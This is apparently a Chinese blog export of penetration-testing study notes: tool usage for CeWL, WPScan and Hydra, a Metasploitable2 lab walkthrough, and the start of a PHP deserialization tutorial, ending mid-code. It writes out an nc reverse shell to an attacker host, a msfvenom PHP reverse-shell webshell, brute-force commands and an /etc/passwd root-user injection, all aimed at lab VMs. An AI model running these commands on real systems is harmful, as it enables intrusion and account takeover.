-e\n\n此时，工具成功在网站中发现了一个Email地址\n计算网站字典中重复的单词数量\n如果你想要计算目标网站中某个词的重复出现次数，你可以使用-c选项来开启参数计算功能：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -c\n\nCewl可以直接统计出目标网站中重复的单词数量\n增加爬取深度\n如果你想增加爬虫的爬取深度以生成更大的字典文件，你可以使用-d选项来指定爬取深度，默认的爬取深度为2：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -d 3\n\n\n\n提取调试信息\n你可以使用–debug选项来开启调试模式，这样就可以查看网站爬取过程中出现的错误和元数据了：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; --debug\n\n\n\nVerbose模式\n为了扩展网站爬取结果，并获取更加完整的数据报告，你可以使用-v选项来进入verbose模式。该模式下，Cewl会导出目标网站的详细数据：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -v\n\n\n\n生成包含数字和字符的字典\n如果你想生成包含数字和字符的字典文件，你可以在命令中使用–with-numbers选项：\ncewl http:&#x2F;&#x2F;testphp.vulnweb.com&#x2F; --with-numbers\n\n\n\nCewl摘要&#x2F;基础认证\n如果目标网站需要进行页面登录认证的话，我们就要使用下列参数来绕过页面认证的限制：\n–auth_type:                      Digest or basic.\n–auth_user:                     Authentication username.\n–auth_pass:                     Authentication password.\ncewl http:&#x2F;&#x2F;192.168.1.105&#x2F;dvwa&#x2F;login.php --auth_type Digest --auth_user admin--auth_pass password -v\n\n或者\ncewl http:&#x2F;&#x2F;192.168.1.105&#x2F;dvwa&#x2F;login.php --auth_type basic --auth_user admin--auth_pass password -v\n\n接收到的http响应码为200，并成功生成了字典\n代理URL\n如果目标网站设置了代理服务器的话，Cewl将无法使用默认命令来生成字典。此时你需要使用–proxy option选项来启用代理URL功能：\ncewl --proxy_host 192.168.1.103 --proxy_port 3128 -w dict.txt http:&#x2F;&#x2F;192.168.1.103&#x2F;wordpress&#x2F;\n\n\n\nwpscan​\tWPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。\n\n\n\n\n\n\n\n\n\nhttps://www.freebuf.com/sectool/174663.html\nhttps://blog.csdn.net/liver100day/article/details/117585795\n扫描WordPress站点\n我们可以使用–enumerate选项来扫描并发现关于目标站点主题、插件和用户名信息。输入下列命令开始对服务器进行扫描：\nwpscan --url http:&#x2F;&#x2F;dc-2\n\n如果你不知道目标服务器的IP地址，你可以直接输入URL地址。\n主题扫描\n使用下列命令对主题进行扫描：\nwpscan --url http:&#x2F;&#x2F;dc-2 --enumerate t\n\n使用下列命令扫描主题中存在的漏洞：\nwpscan --url http:&#x2F;&#x2F;dc-2 --enumerate vt\n\n\n\n插件扫描\n插件可以扩展WordPress站点的功能，但很多插件中都存在安全漏洞，而这也会给攻击者提供可乘之机。\n我们可以使用下列命令扫描WordPress站点中安装的插件：\nwpscan --url http:&#x2F;&#x2F;dc-2 --enumerate p\n\n接下来，我们可以使用下列命令来扫描目标插件中的安全漏洞：\nwpscan --url http:&#x2F;&#x2F;dc-2 --enumerate vp\n\n\n\n使用wpscan进行暴力破解\nwpscan --url http:&#x2F;&#x2F;dc-2 -P &#x2F;home&#x2F;liver100day&#x2F;桌面&#x2F;dc2_passwords.txt -U &#x2F;home&#x2F;liver100day&#x2F;桌面&#x2F;dc2_username.txt\n\n\n\n命令集合\nwpscan --url http:&#x2F;&#x2F;dc-2 --enumerate vp,vt,tt,u\n\n\n\n\n\n主机信息收集查看当前用户whoami\n\n查看内核版本信息uname -a\n\nlsb_release -a\n\n查看账户信息文件cat /etc/passwd\n\n可以收集到很多信息\n一般看到这种id就可以猜测是不是用户名了\n\n可以通过ls -l /home查看home文件夹下有没有之前发现的用户名来验证用户信息\n\n收集用户信息通过之前验证的信息\n然后就可以用ls和cat依次遍历和查看用户文件夹收集信息\n\n\n查看指定文件有多少行cat 文件名 | wc -l\n\n把受害者主机中的文件拷贝到kali主机\nscp /home/space/music/1.mp3 root@www.runoob.com(或者ip):/home/root/others/music \n报错提示连接不上ssh\n\nkali怎么开启ssh可以看这两篇文章\n\n\n\n\n\n\n\n\n\nhttps://www.cnblogs.com/wangjinyu/p/12212536.html\nhttps://www.cnblogs.com/dggsec/p/9465072.html\nscp /home/jim/backups/old-passwords.bak root@192.168.1.133:~/Desktop\n\n就可以成功把文件拷贝到kali上了\n查看某个系统命令是否存在可以通过which来查看某个系统命令是否存在以及执行的到底是哪一个位置的命令\nwhich 可执行文件名称\n\n查找SUID位的程序find / -perm -u=s -user root 2&gt;/dev/null\n#-perm根据权限查找, -u&#x3D;s包含suid位的程序 -user root属主是root用户的, 2&gt;&#x2F;dev&#x2F;null 错误信息扔进垃圾桶\n\n3.漏洞探测弱口令kali中的爆破字典位置 &#x2F;usr&#x2F;share&#x2F;wordlists  rockyou.txt\n\n\n一般默认是没有解压的,我们要自行解压\ngunzip /usr/share/wordlists/rockyou.txt.gz  \n\n查看密码本大小及密码数量\nls -lh /usr/share/wordlists/rockyou.txt查看大小\n\nwc -l /usr/share/wordlists/rockyou.txt查看条数\n\n可是看到kali自带的字典是很大的\n也可以自己设置字典\ncat &gt;&gt; 文件名.txt &lt;&lt; EOF\n\n方法二：使用Hydra暴力破解密码\n\n\n\n\n\n\n\n\n\nhydra使用教程\nhttps://blog.csdn.net/huweiliyi/article/details/105523823\nhttps://blog.csdn.net/weixin_43510203/article/details/107594228\nhttps://cloud.tencent.com/developer/article/1595096\n端口敲门什么是端口敲门\n\n\n\n\n\n\n\n\n\n参考文章\nhttps://zhuanlan.zhihu.com/p/59488488\nhttps://www.cnblogs.com/wsjhk/p/5508051.html\nhttps://cloud.tencent.com/developer/news/477568\n​\t端口敲门（Port knocking）技术，可以理解为密码或者暗号服务，简单来说，就是访问“预先设定好的顺序端口”，服务器收到某客户端的端口尝试序列后，动态修改防火墙规则，打开某特定端口,这时候，这个端口就可以被某IP进行访问了。访问顺序端口跟敲门一样，也类似于密码或者暗号。\n提前要打开kali的ssh服务\n1.安装Knockd服务\napt-get install knockd\n2.编辑配置文件\n两个配置文件的位置:/etc/konckd.conf和/etc/default/knockd\nvi /etc/konckd.conf \n基本不用怎么改动\n\n[options]\n        UseSyslog\n#使用系统的日志文件记录Knockd的服务操作 &#x2F;var&#x2F;log&#x2F;messages\n[openSSH]\n        sequence    &#x3D; 7000,8000,9000 #序列\n        seq_timeout &#x3D; 30 #序列连接的超时时间,默认为5,强烈建议改长一点,比如30\n        command     &#x3D; &#x2F;sbin&#x2F;iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT #iptables是Linux的防火墙管理工具，-I 插入一条规则（默认插入第一条），INPUT指的是入站方向的规则链，-s 指定源地址，%IP%：一个变量，指的是连接的客户端的IP地址，-p 指协议（tcp，udp，ip等），--dport 目标端口，此处可以理解为本机开放的服务，-j 动作，ACCEPT接受，DROP丢弃，-D 删除一条规则\n        tcpflags    &#x3D; syn \n\n[closeSSH]\n        sequence    &#x3D; 9000,8000,7000\n        seq_timeout &#x3D; 30\n        command     &#x3D; &#x2F;sbin&#x2F;iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT\n        tcpflags    &#x3D; syn\n\n[openHTTPS]\n        sequence    &#x3D; 12345,54321,24680,13579\n        seq_timeout &#x3D; 5\n        command     &#x3D; &#x2F;usr&#x2F;local&#x2F;sbin&#x2F;knock_add -i -c INPUT -p tcp -d 443 -f %IP%\n        tcpflags    &#x3D; syn\n\n\nvim /etc/default/knockd\n\n3.启动Knockd服务\nsystemctl start knockd#启动服务\nsystemctl start knockd#设为开机启动\n4.配置防火墙规则,拒绝外部主机连接ssh服务\niptables -I INPUT -p tcp --dport 22 -j REJECT#拒绝,反弹消息\n或\niptables -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT\niptables -A INPUT -p tcp -m tcp --dport 22 -j REJECT\n以上操作就是配置好了端口敲门服务,只有当别人以7000,8000,9000端口序列连接我们时,ssh才能打开22端口\nnc -nv 192.168.2.103 7000\nnc -nv 192.168.2.103 8000\nnc -nv 192.168.2.103 9000\n通过closeSSH的配置序列,我们还能把端口关上\nnc -nv 192.168.2.103 9000\nnc -nv 192.168.2.103 8000\nnc -nv 192.168.2.103 7000\n4.漏洞验证（利用）弱口令爆破kali自带字典暴力破解能成功最重要的条件还是要有一个强大的密码字典！Kali默认自带了一些字典，在 &#x2F;usr&#x2F;share&#x2F;wordlists 目录下\ndirbbig.txt #大的字典\nsmall.txt #小的字典\ncatala.txt #项目配置字典\ncommon.txt #公共字典\neuskera.txt #数据目录字典\nextensions_common.txt #常用文件扩展名字典\nindexes.txt #首页字典\nmutations_common.txt #备份扩展名\nspanish.txt #方法名或库目录\nothers #扩展目录，默认用户名等\nstress #压力测试\nvulns #漏洞测试\n\ndirbusterapache-user-enum-** #apache用户枚举\ndirectories.jbrofuzz #目录枚举\ndirectory-list-1.0.txt #目录列表大，中，小 big，medium，small\n\n\n\nhydraHydra是一款非常强大的暴力破解工具，它是由著名的黑客组织THC开发的一款开源暴力破解工具。Hydra是一个验证性质的工具，主要目的是：展示安全研究人员从远程获取一个系统认证权限。\n语法:\nhydra 参数 IP 服务\n\n参数:\n-l login 小写，指定用户名进行破解\n-L file 大写，指定用户的用户名字典\n-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。\n-P file 大写，用于指定密码字典。\n-M file 指定目标ip列表文件，批量破解。\n-o file 指定结果输出文件\n-t tasks 同时运行的线程数，默认是16\n-v &#x2F; -V 显示详细过程\n-R 恢复爆破（如果破解中断了，下次执行 hydra -R 继续从上一次进度接着破解&#x2F;path&#x2F;to&#x2F;hydra.restore 就可以继续任务。）\n-x 自定义密码。\n-S\t大写，采用SSL链接\n-s\t小写，可通过这个参数指定非默认端口\n-e\t可选选项，n：空密码试探，s：使用指定用户和密码试探\n-C\t使用冒号分割格式，例如“登录名:密码”来代替 -L&#x2F;-P 参数\n-f\t在使用-M参数以后，找到第一对登录名或者密码的时候中止破解\n-w\t设置最大超时的时间，单位秒，默认是30s\nserver\t目标ip\nservice\t指定服务名，支持的服务和协议\n\n服务:\nservice：指定服务名，支持的服务跟协议有：telnet，ftp，pop3等等。\n注意：\n1.自己创建字典,然后放在当前的目录下或者指定目录。\n2.参数可以统一放在最后，格式比如hydra ip 服务 参数。\n3.如果能确定用户名一项时候，比如web登录破解，直接用 -l就可以，然后剩余时间破解密码。\n4.缺点，如果目标网站登录时候需要验证码就无法破解。\n5.man hydra最万能。\n6.或者hydra -U http-form等查看具体帮助。\n\n\n\n破解ssh我们使用如下命令\nhydra -L user.txt -P passwd.txt -o ssh.txt -vV -t ip  ssh -s 22   \n-L 指定用户字典文件 \n-P 指定密码字典文件  \n-o 把成功的输出到ssh.txt文件 \n-vV 显示详细信息  \n-s 指定其他端口 如果要修改默认22端口，可以使用 -s 参数\n\nhttp协议破解get方式提交，破解web登录：\n \nhydra -L 用户名字典 -P 密码字典 -t 线程 -v -e ns IP地址 http-get &#x2F;admin&#x2F;\nhydra -L 用户名字典 -P 密码字典 -t 线程 -v -e ns -f IP地址 http-get &#x2F;admin&#x2F;index.php\n \npost方式提交，破解web登录：\n \nhydra -f -l 用户名 -P 密码字典 -V -s 9900 IP地址 http-post-form &quot;&#x2F;admin&#x2F;index.php?action&#x3D;login:user&#x3D;USER&amp;pw&#x3D;PASS:&quot;\n \n \n#&#x2F;index.php …这个是登录的 url\n#后门是POST的数据 其中的用户名密码使用 USER PASS 来代替\n#然后是如果登录出错 会出现的字符 。。。然后开始破解\n\nhttps协议破解hydra -m &#x2F;index.php -l 用户名 -P 密码字典.txt IP地址 https\n\nhttp-proxy协议破解hydra -l admin -P 字典.txt http-proxy:&#x2F;&#x2F;IP地址\n\n\n\n密码破解hash-identifier 当不知道编码或者密文是什么类型的时候，可以通过kali系统中的 hash 工具判别\n\n\njohn​\tJohn the Ripper 是一款大受欢迎的、免费的开源软件。也是一个基于字典的快速破解密码的工具，是一款用于在已知密文的情况下尝试破解出明文的破解密码软件，支持目前大多数的加密算法，如 DES 、 MD4 、 MD5 等。 John the Ripper 支持字典破解方式和暴力破解方式。它支持多种不同类型的系统架构，包括 Unix 、 Linux 、 Windows 、 DOS 模式、 BeOS 和 OpenVMS ，主要目的是破解不够牢固的 Unix/Linux 系统密码\n一些参考文章\n\n\n\n\n\n\n\n\n\nhttps://blog.csdn.net/i_can1/article/details/107227565\nhttps://www.cnblogs.com/HelloCTF/p/13346125.html\nhttps://www.cnblogs.com/Junglezt/p/16048189.html\n反弹shell参考文章\n\n\n\n\n\n\n\n\n\nhttps://blog.csdn.net/mirocky/article/details/112674080\nhttps://cloud.tencent.com/developer/article/1818091\nhttps://www.freebuf.com/articles/web/247967.html\n利用nc借助kali的nc工具\nnc 借助tcp&#x2F;ip传输数据\n远程控制\n正向连接\n反向连接(反弹shell)   让目标主动连接我方kali等设备,成功之后把shell传给攻击者\nkali端:nc -l -p 888(随便一个端口,但一定要是未使用的)\nnc -l -p 888    \n&#x2F;&#x2F;kali开启侦听某一端口,这里相当于kali变成了服务端\n&#x2F;&#x2F;-l 侦听(listen)\n&#x2F;&#x2F;-p 指定侦听的端口\n\n\n目标端(受害者):nc -nv kali主机ip 2226 -c /bin/bash \nnc -nv kali主机ip 888 -c &#x2F;bin&#x2F;bash   \n&#x2F;&#x2F;-c 传递一个shell命令,&#x2F;bin&#x2F;bash就相当把受害主机的shell传过去了\n&#x2F;&#x2F;-n 不做名称解析,提高连接速度\n&#x2F;&#x2F;-v 显示详细信息\n\n\n就可以看到kali已经拿到shell了\n\n获取一个交互式的shell:python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;\n\n利用msfvenom生成木马通过利用msfvenom生成一段反弹木马(webshell)\n生成php木马msfvenom -p php/meterpreter/reverse_tcp LHOST=攻击端(监听端)ip LPORT=4444(端口) &gt; shell.php\n查看木马\ncat shell.php\n\n然后就可以把这段代码写入web页面,同时kali开启监听\nkali监听:\n打开msf\nuse exploit&#x2F;multi&#x2F;handler  #调用监听控制模块\nset payload php&#x2F;meterpreter&#x2F;reverse_tcp  #设置payload\nset LHOST kali端ip  #设置漏洞地址\nset lport 4444  #设置监听端口\nexploit \n\n\nweb页面执行之前生成的木马就行了\n横向移动可以根据已得到的信息，条件去获取(渗透)系统或LAN内的其他主机的权限(信息)的一种攻击行为\n这里拿dc-4靶机举例\n1.信息收集同之前的信息收集类似\nuname -r           看内核信息\nip a               看IP地址\nhostname           看主机名\nwhoami             看当前用户\ncat &#x2F;etc&#x2F;passwd    看账户信息\nls &#x2F;home           验证用户信息(看有没有他名字对应的文件夹)\n\n之后把你收集到的信息转移到kali中\ncp /home/jim/backups/old-passwords.bak root@192.168.1.133:~/Desktop\n2.针对用户制作字典可以利用信息收集得到的情报制作字典\n3.尝试使用工具破解远程主机这里主要介绍使用hydra破解远程主机\nhydra -L username.txt -P old-passwords.bak 192.168.1.132 ssh\n\n4.ssh远程登录ssh jim@192.168.1.132,然后输入密码\n\n\n5.提权见本篇提权部分\n5.权限维持rbash逃逸rbash(The restricted mode of bash),也就是限制型bash；是平时所谓的 restricted shell的一种，也是最常见的 restricted shell（rbash、ksh、rsh等）\n一些参考文章\n\n\n\n\n\n\n\n\n\nhttps://xz.aliyun.com/t/7642\nhttps://blog.csdn.net/qq_43168364/article/details/111830233\n6.权限提升前期工作收集漏洞这里介绍kali的searchsploit\nsearchsploit通过搜索关键词找到需要的漏洞，可以理解为一个离线的漏洞库\n详细使用见:\n\n\n\n\n\n\n\n\n\nhttps://zhuanlan.zhihu.com/p/366946217\n\n查看自己的sudo授权列表sudo -l\n\n\n尝试切换用户su - 用户名\n输入密码\nteehee提权teehee是个小众的linux编辑器。如果有sudo权限。可以利用其来提权\n核心思路就是利用其在passwd文件中追加一条uid为0的用户条目\necho &quot;raaj::0:0:::&#x2F;bin&#x2F;bash&quot; | sudo teehee -a &#x2F;etc&#x2F;passwd\n\n按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录。所以只需要执行su raaj就可以登录到raaj用户，这个用户因为uid为0，所以也是root权限\n# teehee 可以将标准输入复制到文件中\n# 如下命令可以在 &#x2F;etc&#x2F;passwd 文件中添加一行，实现添加一个拥有 root 权限的用户\n\necho &quot;test::0:0:::&#x2F;bin&#x2F;sh&quot; | sudo teehee -a &#x2F;etc&#x2F;passwd\n&#x2F;&#x2F;test是用户名\n&#x2F;&#x2F;test::意思是test用户,密码为空\n&#x2F;&#x2F;test::0:0:::&#x2F;bin&#x2F;sh 意思是用户名为test,密码为空的超级用户\n&#x2F;&#x2F;-a 追加到..\n&#x2F;&#x2F; &#x2F;etc&#x2F;passwd 用户账号信息文件\n\n# 切换用户\nsu test\n\n\ngit提权什么是git?\nGIT，全称是分布式版本控制系统，git通常在编程中会用到，并且git支持分布式部署，可以有效、高速的处理从很小到非常大的项目版本管理。分布式相比于集中式的最大区别在于开发者可以提交到本地，每个开发者通过克隆（git clone），在本地机器上拷贝一个完整的Git仓库。\n参考文章\n\n\n\n\n\n\n\n\n\nhttps://blog.csdn.net/qq_38612882/article/details/122772867\nhttps://www.cnblogs.com/HelloCTF/p/12803808.html\nhttps://blog.csdn.net/G_Fu_Q/article/details/116276096\n","slug":"渗透测试流程","date":"2023-01-12T03:28:53.132Z","categories_index":"学习笔记,渗透从入门到入土","tags_index":"渗透测试","author_index":"Abyssaler"},{"id":"0b088cb7730fbb88856526a3dd3f4899","title":"metasploitable2靶场渗透","content":"前言Metasploitable2 虚拟系统是一个特别制作的ubuntu操作系统，本身设计作为安全工具测试和演示常见漏洞攻击。这个版本的虚拟系统兼容VMware。当虚拟系统启动之后，使用用户名：msfadmin 和密码msfadmin登陆 适用于学习网络安全新手学习\n下载地址链接：https://pan.baidu.com/s/1Q46VYaLlNCxA8O1SsEVWCg?pwd=gbs1提取码：gbs1\n实验环境metasploitable2靶机ip：192.168.235.129\nkali攻击机ip：192.168.235.130\n渗透测试信息收集主机发现首先arp-scan -l扫描一下内网\n可以发现存活的主机\n\n端口扫描使用nmap -sV 192.168.235.129扫描端口\n\n\n\n\n\n\n\n\n\nnmap的具体用法可以参看站内文章：\nhttps://abyssaler.github.io/post/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B\n\n漏洞利用收集到足够的信息后，就可以为其选择正确的exp和合适的payload了\nsamba漏洞利用打开msf\nmsfconsole\n输入msf&gt;search samba命令搜索samba的漏洞利用模块，并选择合适的漏洞利用模块\n\n各个漏洞会按被利用成功的相对难易程度进行排序\n因为exploit&#x2F;multi&#x2F;samba&#x2F;usermap_script被标记为Excellent，为了提高渗透成功率，这里选择此模块进行接下来的渗透\n查看漏洞的详细信息\ninfo exploit/multi/samba/usermap_script\n\n使用use exploit/multi/samba/usermap_script即可利用该漏洞利用模块\n\n使用show payloads命令查看可利用的payload\n\n这里我们选择cmd&#x2F;unix&#x2F;reverse反向攻击载荷模块\n\n设置被攻击主机ip地址\nset rhost 192.168.235.129\n设置漏洞利用的端口号,这里我们选择445\nset rport 445\n设置发动攻击主机ip地址\nset lhost 192.168.235.130\n最后检查参数是否正确\nshow options\n\n设置完所有参数后,使用exploit或者run发动攻击\nmaf发动攻击成功后会获取目标主机的shell,为了验证该shell是目标主机的,可以查询主机名,用户名,ip地址等\n\n至此,samba漏洞就利用成功了\n笑脸漏洞后门利用\n\n\n\n\n\n\n\n\n笑脸漏洞相关介绍:\nhttps://blog.csdn.net/weixin_52497013/article/details/121090861\n看到有21端口,还可以试一下vsfpd漏洞\nmsf6 &gt; search vsftd\n[-] No results from search\nmsf6 &gt; search vsftpd\n\nMatching Modules\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n\n   #  Name                                  Disclosure Date  Rank       Check  Description\n   -  ----                                  ---------------  ----       -----  -----------\n   0  exploit&#x2F;unix&#x2F;ftp&#x2F;vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution\n\n\nInteract with a module by name or index. For example info 0, use 0 or use exploit&#x2F;unix&#x2F;ftp&#x2F;vsftpd_234_backdoor\n\nmsf6 &gt; use 0\n[*] No payload configured, defaulting to cmd&#x2F;unix&#x2F;interact\n\n\nset rhost 192.168.235.129\nset lhost 192.168.235.130\nshow options\n\nrun\n\n利用成功\n22端口暴力破解搜索\nSearch  ssh_login\n使用\nUse  auxiliary/scanner/ssh/ssh_login \n设置目标地址\nset rhost 192.168.235.129\n设置用户字典路径 \nset USER_FILE /usr/share/wordlists/metasploit/mirai_user.txt\n设置字典密码路径\nset PASS_FILE /usr/share/wordlists/FastPwds.txt\n设置线程是100\nSet   THREADS   100 \n开跑\nrun\n23端口(telnet)暴力破解search telnet\nuse auxiliary/scanner/telnet/telnet_login\nset rhost 192.168.235.129\nset user_file /root/Desktop/0.txt\nset pass_file /root/Desktop/1.txt\nrun\n\n80端口漏洞利用use exploit/multi/http/php_cgi_arg_injection\nset rhost 192.168.235.129\nrun\n\n1099端口java反序列化命令执行漏洞use exploit/multi/misc/java_rmi_server\nsessions\nset rhost 192.168.235.129\nrun\n\n后记metasploitable2靶场作为一个对初学者非常友好的靶场,还有很多其他漏洞可以利用,在这里就不一一复现了,想了解该靶场的其他漏洞可以看看这几篇文章\n\n\n\n\n\n\n\n\n\nhttps://www.freebuf.com/articles/web/286084.html\nhttps://blog.csdn.net/Aluxian_/article/details/123355133\nhttps://blog.csdn.net/m0_46371267/article/details/120740639\n","slug":"metasploitable2靶场渗透","date":"2023-02-13T01:13:07.350Z","categories_index":"渗透从入门到入土","tags_index":"vulhub","author_index":"Abyssaler"},{"id":"27a8c82d6074b44b0feedf4a65c9f85a","title":"php反序列化漏洞学习","content":"前言php反序列化漏洞一直是自己的一个弱项，想到上次ctf比赛就是因为web的最后一道题是php反序列化没有思路导致成绩不太理想，特此做个学习笔记以便自己以后查阅\nphp面向对象基本概念面向对象首先要明确面向对象程序开发的概念\n面向过程：\n面向过程是一种以“整体事件” 为中心的编程思想，编程的时候把解决问题的步骤分析出来,，然后用函数把这些步骤实现，在一步一步的具体步骤中再按顺序调用函数。\n面向对象：\n面向对象是一种以“对象”为中心的编程思想，把要解决的问题分解成各个“对象”;\n对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象。\n对象的三个特征：对象的行为，对象的形态，对象的表示\n类的定义类是定义了一件事物的抽象特点，它将数据的形式以及这些数据上的操作封装在一起。\n对象是具有类类型的变量，是对类的实例。\n内部构成：成员变量（属性）+成员函数（方法）\n变量定义在类里面就叫成员属性\n在类外面叫成员函数，在类里面叫成员方法\n\n继承：继承性是子类自动共享父类数据结构和方法的机制，是类之间的一种关系。\n在定义和实现一个类的时候，可以在一一个已经存在的类的基础之上来进行，把一个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。\n父类：一个类被其他类继承，可将该类成为父类，或基类，超类\n子类：一个类继承其他类称为子类，也可以称为派生类\n类与对象类的结构\n其实类里面应该还有成员常量的，但因为我学这个不是搞开发，所以用到的成员常量不多，就不做了解\n类的内容class hero  &#x2F;&#x2F;定义类（类名）\n&#123;\n    &#x2F;&#x2F;声明成员变量\n\tvar $name; &#x2F;&#x2F;var为一种修饰符，先不管，默认是public\n\tvar $sex;\n    &#x2F;&#x2F;声明成员函数（方法）\n\tfunction jineng($var1)\n\t&#123;\n\t\techo $this-&gt;name;  &#x2F;&#x2F;使用预定义$this调用成员变量\n\t\techo $var1;  &#x2F;&#x2F;成员函数传参$var1可直接调用\n\t&#125;\n&#125;\n\n实例化和赋值&lt;?php\nhighlight_file(__FILE__);\nclass hero&#123;\n  var $name;\n  var $sex;\n  function jineng($var1) &#123;\n    echo $this-&gt;name.&quot;&lt;br &#x2F;&gt;&quot;;\n    echo $var1.&quot;&lt;br &#x2F;&gt;&quot;;\n    &#125;\n&#125;\n\n$cyj&#x3D; new hero();  &#x2F;&#x2F;实体化成对象\n$cyj-&gt;name&#x3D;&#39;chengyaojin&#39;;  &#x2F;&#x2F;赋值\n$cyj-&gt;sex&#x3D;&#39;man&#39;;\n$cyj-&gt;jineng(&#39;zuofan&#39;);\nprint_r($cyj); &#x2F;&#x2F;对象不能使用echo输出，要么用print_r，要么用var_dump\n\n?&gt;\n\n\n类的修饰符介绍\n\n代码演示\n&lt;?php\nhighlight_file(__FILE__);\nclass hero&#123;\n  public  $name&#x3D;&#39;chengyaojin&#39;;  &#x2F;&#x2F;公共的\n  private  $sex&#x3D;&#39;man&#39;;  &#x2F;&#x2F;私有的，别人看不到\n  protected  $shengao&#x3D;&#39;165&#39;;  &#x2F;&#x2F;受保护的：内部，子类可用\n  function jineng($var1) &#123;\n    echo $this-&gt;name;\n    echo $var1;\n    &#125;\n&#125;\n$cyj&#x3D; new hero();\necho $cyj-&gt;name.&quot;&lt;br &#x2F;&gt;&quot;;  &#x2F;&#x2F;可以调用成功\necho $cyj-&gt;sex.&quot;&lt;br &#x2F;&gt;&quot;;  &#x2F;&#x2F;不能调用成功\necho $cyj-&gt;shengao.&quot;&lt;br &#x2F;&gt;&quot;;  &#x2F;&#x2F;不能调用成功\n?&gt;\n\n结果：\n\n代码演示2\n&lt;?php\nhighlight_file(__FILE__);\nclass hero&#123;\n  public  $name&#x3D;&#39;chengyaojin&#39;; &#x2F;&#x2F;公共的\n  private  $sex&#x3D;&#39;man&#39;;  &#x2F;&#x2F;私有的\n  protected  $shengao&#x3D;&#39;165&#39;;  &#x2F;&#x2F;受保护的：内部，子类可用\n  function jineng($var1) &#123;\n    echo $this-&gt;name;\n    echo $var1;\n    &#125;\n&#125;\n&#x2F;&#x2F;子类\nclass hero2 extends hero&#123;\n    function test()&#123;\n    echo $this-&gt;name.&quot;&lt;br &#x2F;&gt;&quot;;  &#x2F;&#x2F;子类可用\n    echo $this-&gt;sex.&quot;&lt;br &#x2F;&gt;&quot;;  &#x2F;&#x2F;子类不可用\n    echo $this-&gt;shengao.&quot;&lt;br &#x2F;&gt;&quot;;  &#x2F;&#x2F;子类可用\n    &#125;\n&#125;\n$cyj&#x3D; new hero();\n$cyj2&#x3D;new hero2();\necho $cyj-&gt;name.&quot;&lt;br &#x2F;&gt;&quot;;  &#x2F;&#x2F;外部之可用public\necho $cyj2-&gt;test();  &#x2F;&#x2F;子类内部可用public和protected\n?&gt;\n\n结果：\n\n类的成员方法\n总结类是对象的抽象，而对象是类的具体实例\n类是想法，把类实例化（new），调用具体值后就变成了对象\n序列化基础知识序列化的作用序列化(Serialization)是将对象的状态信息(属性)转换为可以存储或传输的形式的过程。\n\n将对象或者数组转化为可储存&#x2F;传输的字符串。\n在php中使用函数serialize()来将对象或者数组进行序列化，并返回一个包含字节流的字符串来表示\n表达方式代码：\n&lt;?php\nhighlight_file(__FILE__);\nclass TEST &#123;\n    public $data;\n    public $data2 &#x3D; &quot;dazzhuang&quot;;\n    private $pass;\n\n    public function __construct($data, $pass)\n    &#123;\n        $this-&gt;data &#x3D; $data;\n        $this-&gt;pass &#x3D; $pass;\n    &#125;\n&#125;\n$number &#x3D; 34;\n$str &#x3D; &#39;user&#39;;\n$bool &#x3D; true;\n$null &#x3D; NULL;\n$arr &#x3D; array(&#39;a&#39; &#x3D;&gt; 10, &#39;b&#39; &#x3D;&gt; 200);\n$test &#x3D; new TEST(&#39;uu&#39;, true);\n$test2 &#x3D; new TEST(&#39;uu&#39;, true);\n$test2-&gt;data &#x3D; &amp;$test2-&gt;data2;\necho serialize($number).&quot;&lt;br &#x2F;&gt;&quot;;\necho serialize($str).&quot;&lt;br &#x2F;&gt;&quot;;\necho serialize($bool).&quot;&lt;br &#x2F;&gt;&quot;;\necho serialize($null).&quot;&lt;br &#x2F;&gt;&quot;;\necho serialize($arr).&quot;&lt;br &#x2F;&gt;&quot;;\necho serialize($test).&quot;&lt;br &#x2F;&gt;&quot;;\necho serialize($test2).&quot;&lt;br &#x2F;&gt;&quot;;\n?&gt;\n\n结果：\ni:34;\ns:4:&quot;user&quot;;\nb:1;\nN;\na:2:&#123;s:1:&quot;a&quot;;i:10;s:1:&quot;b&quot;;i:200;&#125;\nO:4:&quot;TEST&quot;:3:&#123;s:4:&quot;data&quot;;s:2:&quot;uu&quot;;s:5:&quot;data2&quot;;s:9:&quot;dazzhuang&quot;;s:10:&quot;TESTpass&quot;;b:1;&#125;\nO:4:&quot;TEST&quot;:3:&#123;s:4:&quot;data&quot;;s:9:&quot;dazzhuang&quot;;s:5:&quot;data2&quot;;R:2;s:10:&quot;TESTpass&quot;;b:1;&#125;\n\n说明：\n\n\n对象序列化：\n\n\n不同的修饰符序列化后的表达都不同，这里的%00其实是url编码过后的二进制00，事实上就是加了一个空\n&lt;?php\nhighlight_file(__FILE__);\nclass test&#123;\n    private $pub&#x3D;&#39;benben&#39;;\n    function jineng()&#123;\n        echo $this-&gt;pub;\n    &#125;\n&#125;\n$a &#x3D; new test();\necho 